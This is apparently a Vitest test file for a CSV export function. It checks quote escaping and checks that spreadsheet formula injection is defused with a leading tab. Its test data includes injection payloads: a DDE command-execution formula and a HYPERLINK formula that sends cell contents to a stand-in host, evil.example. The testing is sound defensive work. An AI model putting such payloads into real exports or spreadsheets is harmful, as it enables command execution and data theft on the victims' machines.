/**
 * CSV export safety.
 *
 * Two independent hazards, both of which a naive `values.join(",")` walks
 * straight into:
 *
 *  - RFC 4180 escaping: a comma or quote in a member's name corrupts every
 *    column after it.
 *  - CSV injection: Excel/Sheets execute a cell starting with = + - or @, so a
 *    hostile member name becomes code execution on the organiser's machine when
 *    they open the export.
 */
import { describe, it, expect } from "vitest";

import { toCsv } from "@/features/reports/export";

const report = (rows) => ({
  columns: [
    { key: "member", label: "Member" },
    { key: "amount", label: "Amount" },
  ],
  rows,
});

describe("toCsv — RFC 4180 escaping", () => {
  it("writes a header row and one row per record", () => {
    const csv = toCsv(report([{ member: "Rahima", amount: "৳5,000.00" }]));
    const [header] = csv.split("\r\n");
    expect(header).toBe("Member,Amount");
  });

  it("quotes values containing a comma", () => {
    // Money is formatted with thousands separators, so this is every amount
    // over 999 — not an edge case at all.
    const csv = toCsv(report([{ member: "Rahima", amount: "৳5,000.00" }]));
    expect(csv).toContain('"৳5,000.00"');
  });

  it("doubles inner quotes rather than breaking the field", () => {
    const csv = toCsv(report([{ member: 'Rahima "Rani" Akter', amount: "1" }]));
    expect(csv).toContain('"Rahima ""Rani"" Akter"');
  });

  it("quotes values containing a newline", () => {
    const csv = toCsv(report([{ member: "Line1\nLine2", amount: "1" }]));
    expect(csv).toContain('"Line1\nLine2"');
  });

  it("renders null and undefined as empty, not the strings 'null'/'undefined'", () => {
    const csv = toCsv(report([{ member: null, amount: undefined }]));
    expect(csv.split("\r\n")[1]).toBe(",");
  });
});

describe("toCsv — formula injection", () => {
  // Each of these is executed by Excel/Sheets if written raw.
  const dangerous = [
    "=1+1",
    "+1+1",
    "-1+1",
    "@SUM(A1)",
    `=cmd|'/c calc'!A1`,
    `=HYPERLINK("http://evil.example/?x="&A1,"Click")`,
  ];

  it.each(dangerous)("neutralises %s with a leading tab", (payload) => {
    const csv = toCsv(report([{ member: payload, amount: "1" }]));
    const dataRow = csv.split("\r\n")[1];

    // The tab prefix stops the formula evaluating while displaying the same.
    expect(dataRow.startsWith("\t") || dataRow.startsWith('"\t')).toBe(true);
    // And it must never appear as a bare formula at the start of the field.
    expect(dataRow.startsWith(payload)).toBe(false);
  });

  it("leaves ordinary values untouched", () => {
    const csv = toCsv(report([{ member: "Rahima Akter", amount: "500" }]));
    expect(csv.split("\r\n")[1]).toBe("Rahima Akter,500");
  });

  it("still escapes an injection payload that also contains a comma", () => {
    // Both defences have to apply — de-fanging must not skip the quoting.
    const csv = toCsv(report([{ member: "=SUM(1,2)", amount: "1" }]));
    const dataRow = csv.split("\r\n")[1];
    expect(dataRow).toBe('"\t=SUM(1,2)",1');
  });
});
